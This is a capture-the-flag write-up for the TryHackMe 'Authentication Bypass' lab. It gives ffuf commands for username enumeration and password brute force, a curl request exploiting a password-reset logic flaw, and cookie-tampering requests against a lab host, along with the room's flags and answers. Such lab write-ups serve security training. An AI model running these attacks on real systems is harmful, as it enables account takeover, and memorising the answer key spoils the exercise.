![Authentication Bypass Banner](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Banner.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Cover.png" alt="Authentication Bypass Logo">
</p>

# Authentication Bypass

This guide contains the answer and steps necessary to get to them for the [Authentication Bypass](https://tryhackme.com/room/authenticationbypass) room.

## Table of contents

- [Username Enumeration](#username-enumeration)
- [Brute Force](#brute-force)
- [Logic Flaw](#logic-flaw)
- [Cookie Tampering](#cookie-tampering)

### Username Enumeration

1. What is the username starting with si*** ?

   We have a form which seems to leak more information than we should.
   
   ![Exists](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Enumeration_Exists.png)
   
   To abuse the fact that a result is returned when the username already exists we can use ffuf with the following commands and names takes from the source page:
   
   ![Source](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Enumeration_Source.png)
   
   ```cmd
   ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.47.167/customers/signup -mr "username already exists"
   ```

   ![Users](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Enumeration_Users.png)

   ><details><summary>Click for answer</summary>Simon</details>

2. What is the username starting with st*** ?

   This was found with the above command.

   ><details><summary>Click for answer</summary>Steve</details>

3. What is the username starting with ro**** ?

   This was found with the above command.

   ><details><summary>Click for answer</summary>Robert</details>

### Brute Force

1. What is the valid username and password (format: username/password)?

   After putting the usernames in a text files we can combine it with a password wordlist in ffuf.
   
   ```cmd
   ffuf -w usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.47.167/customers/login -fc 200  
   ```

   ![Password](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Brute_Force_Password.png)

   ><details><summary>Click for answer</summary>steve/thunder</details>

### Logic Flaw

1. What is the flag from Robert's support ticket?

   The following form allows us to reset someones password and send the email to us.
   
   ![Form](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Logic_Form.png)
   
   ```cmd
   curl "http://10.10.47.167/customers/reset?email=robert@acmeitsupport.thm" -H "Content-Type: application/x-www-form-urlencoded" -d "username=robert&email=1337h4ck3r@customer.acmeitsupport.thm"
   ```

   Here we receive the ticket to log into the account.
   
   ![Ticket](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Logic_Ticket.png)
   
   And now we can access the flag on Roberts account.
   
   ![Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Logic_Flag.png)
   
   ><details><summary>Click for answer</summary>THM{AUTH_BYPASS_COMPLETE}</details>

### Cookie Tampering 

1. What is the flag from changing the plain text cookie values?

   We can use the following command to check if we are logged in:

   ```cmd
   curl http://10.10.47.167/cookie-test -H "Cookie: logged_in=true	"
   ```
   
   The next command should also give us admin privileges:
   
   ```cmd
   curl http://10.10.47.167/cookie-test -H "Cookie: logged_in=true; admin=true"
   ```
   
   ![Admin](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Cookie_Admin.png)
   
   ><details><summary>Click for answer</summary>THM{COOKIE_TAMPERING}</details>

2. What is the value of the md5 hash 3b2a1053e3270077456a79192070aa78 ?

   Using crackstation, we can get the string belonging to this hash.
   
   ![MD5](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Cookie_MD5.jpeg)

   ><details><summary>Click for answer</summary>463729</details>

3. What is the base64 decoded value of VEhNe0JBU0U2NF9FTkNPRElOR30= ?

   To decode a Base64 strings we can use CyberChef.
   
   ![Base 64](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/authenticationbypass/Authentication_Bypass_Cookie_Base_64.png)

   ><details><summary>Click for answer</summary>THM{BASE64_ENCODING}</details>

4. Encode the following value using base64 {"id":1,"admin":true}

   Encoding to Base64 can also be done with CyberChef.

   ><details><summary>Click for answer</summary>eyJpZCI6MSwiYWRtaW4iOnRydWV9</details>
